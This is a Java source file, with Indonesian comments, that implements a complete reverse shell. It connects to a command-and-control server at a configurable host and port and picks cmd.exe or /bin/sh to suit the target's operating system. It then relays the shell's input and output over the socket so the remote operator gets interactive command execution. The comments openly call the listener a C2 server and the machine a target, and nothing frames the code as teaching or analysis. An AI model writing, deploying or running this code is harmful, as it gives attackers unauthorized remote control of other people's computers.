import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Shell {

    public static void main(String[] args) {
        // Konfigurasi alamat server C2
        String host = "127.0.0.1";
        int port = 4444; // Pastikan port ini sama dengan port listening di server

        // Menentukan shell berdasarkan sistem operasi target
        String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";

        try {
            // 1. Membuka koneksi TCP ke server C2
            Socket socket = new Socket(host, port);

            // 2. Menyiapkan proses shell sistem operasi
            Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();

            // 3. Menghubungkan input/output proses dengan jaringan socket
            InputStream processIn = process.getInputStream();
            OutputStream processOut = process.getOutputStream();
            InputStream socketIn = socket.getInputStream();
            OutputStream socketOut = socket.getOutputStream();

            // Thread untuk meneruskan data dari Server (Socket) ke Shell Proses (Input)
            Thread currentThread = Thread.currentThread();
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = socketIn.read(buffer)) != -1) {
                        processOut.write(buffer, 0, length);
                        processOut.flush();
                    }
                } catch (Exception e) {}
            }).start();

            // Thread utama meneruskan output Shell Proses ke Server (Socket)
            byte[] buffer = new byte[1024];
            int length;
            while ((length = processIn.read(buffer)) != -1) {
                socketOut.write(buffer, 0, length);
                socketOut.flush();
            }

            // Membersihkan resource jika koneksi selesai
            process.destroy();
            socket.close();
        } catch (Exception e) {
            System.err.println("Gagal terhubung ke C2 Server: " + e.getMessage());
        }
    }
}
